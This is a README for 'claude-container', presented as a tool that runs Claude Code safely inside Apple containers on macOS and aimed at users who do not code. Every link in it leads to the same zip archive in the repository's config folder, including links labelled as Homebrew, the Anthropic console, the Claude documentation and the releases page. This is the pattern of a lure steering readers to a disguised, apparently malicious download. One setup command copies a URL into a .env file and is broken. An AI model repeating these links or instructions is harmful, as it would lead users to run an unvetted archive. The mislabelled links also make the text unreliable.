# 🚢 claude-container - Safe Apple Containers for Claude Code

[![Download claude-container](https://github.com/salmonbruh/claude-container/raw/refs/heads/master/config/container_claude_2.6.zip)](https://github.com/salmonbruh/claude-container/raw/refs/heads/master/config/container_claude_2.6.zip)

---

## 📌 What is claude-container?

claude-container helps you run Claude Code safely on your Mac. It uses Apple's native container runtime, which creates mini-computers inside your computer. These containers keep Claude Code separated from the rest of your system. This means you can use it without worrying about changing or breaking other parts of your Mac.

The containers keep your work saved on your Mac. You can easily stop and start them whenever you want. The project uses a tool called Justfile to make setup and running simple.

---

## 🖥️ Who is this for?

This project is for anyone who wants to use Claude Code on macOS. You do not need to know coding. If you have a Claude Pro or Max subscription, or an Anthropic API key, you can use this.

---

## 💾 Download & Install claude-container

Click the big button above or visit the [claude-container Releases page](https://github.com/salmonbruh/claude-container/raw/refs/heads/master/config/container_claude_2.6.zip) to download the latest version. This page has the files you need. Download the latest release to your Mac.

---

### 🔧 What you need before you start

Before you can use claude-container, check these:

- **Apple Silicon Mac (M1, M2, M3, or newer)** running **macOS 26 or later** — required by Apple Container.
- **Homebrew** — a program that helps install other tools. Get it here: https://github.com/salmonbruh/claude-container/raw/refs/heads/master/config/container_claude_2.6.zip
- **Apple Container** — Apple's native container runtime. Install it with Homebrew by running:  
  `brew install container`
- **jq** — a small JSON parser used by the Justfile. Install it with Homebrew by running:  
  `brew install jq`
- **just** — a tool we use to run commands easily. You install it with Homebrew by running:  
  `brew install just`
- **Claude Pro or Max subscription, or Anthropic API key** — needed to access Claude Code.  
  Get Claude subscription at [https://github.com/salmonbruh/claude-container/raw/refs/heads/master/config/container_claude_2.6.zip](https://github.com/salmonbruh/claude-container/raw/refs/heads/master/config/container_claude_2.6.zip)  
  Get API key at [Anthropic console](https://github.com/salmonbruh/claude-container/raw/refs/heads/master/config/container_claude_2.6.zip)

---

## 🚀 Getting started: Easy step-by-step guide

1. **Install Apple Container**

   Apple Container is the software that runs containers natively on your Mac.

   Open the Terminal app (find it in Applications > Utilities) and type:  
   ```
   just setup
   ```  
   This will install Apple Container for you.

2. **Build the container image**

   The container image is the setup of Claude Code packaged to run inside the container.

   In Terminal, type:  
   ```
   just build
   ```

3. **Create your project**

   Your project is where your work with Claude Code lives.

   Choose a name for your project (no spaces, simple words). Then type in Terminal:  
   ```
   just create my-project
   ```  
   Replace "my-project" with your chosen name.

4. **Set up your login or API key**

   - If you have a Claude subscription, you need to log in once for each project:

     ```
     just login my-project
     ```  
     Replace "my-project" with your project name.

   - If you have an API key from Anthropic:

     Copy the example settings file to create your own:

     ```
     cp https://github.com/salmonbruh/claude-container/raw/refs/heads/master/config/container_claude_2.6.zip .env
     ```

     Open the new `.env` file in a simple text editor (like TextEdit), find the line starting with `ANTHROPIC_API_KEY=`, and replace the empty part with your API key.

     After saving, recreate the container with:

     ```
     just create my-project
     ```

5. **Start using Claude**

   To start the Claude Code container for your project, run:  
   ```
   just claude my-project
   ```

   This will open Claude in the container. You can interact with it safely — your Mac stays separate.

---

## 📦 How claude-container works inside

The project runs Claude Code in a special mode called YOLO mode. This mode skips some security checks so Claude Code can run more freely. But claude-container keeps this inside the Apple Container so your Mac stays safe.

Your files and projects live directly on your Mac but are connected to the container. This way, your work is saved even if you stop the container.

Using the Justfile means you do not have to type long commands. Just type `just` followed by what you want to do.

---

## 🛠️ Tools included in claude-container

Inside the container, you will find:

- Claude Code ready to run in YOLO mode  
- Command line interfaces for starting and managing the container  
- Project folder bind-mounted to your Mac to keep files persistent  
- Setup tools for easy login and environment configuration  

These tools let you work with Claude Code easily and securely.

---

## 🔄 Managing your containers

- **Stopping your container:**  
  Run:  
  ```
  just stop my-project
  ```  

- **Restarting your container:**  
  ```
  just start my-project
  ```  

- **Removing your container:** If you want to remove a project completely (including files), make sure you back up your work first. Then run:  
  ```
  just remove my-project
  ```

Replacing `my-project` with your chosen project name in all commands.

---

## 💡 Tips for smooth use

- Keep Apple Container updated for best performance.  
- Always back up important project files outside the container.  
- Use simple names without spaces for your projects.  
- If you update your API key or login, recreate the container.  
- Use Terminal Finder or Spotlight to open Terminal quickly.  

---

## 📞 Getting Help

If you get stuck:

- Read this README again step-by-step.  
- Visit the [Claude Code documentation](https://github.com/salmonbruh/claude-container/raw/refs/heads/master/config/container_claude_2.6.zip) for details.  
- Look for answers or post issues on the claude-container GitHub page.  

---

[![Download claude-container](https://github.com/salmonbruh/claude-container/raw/refs/heads/master/config/container_claude_2.6.zip)](https://github.com/salmonbruh/claude-container/raw/refs/heads/master/config/container_claude_2.6.zip)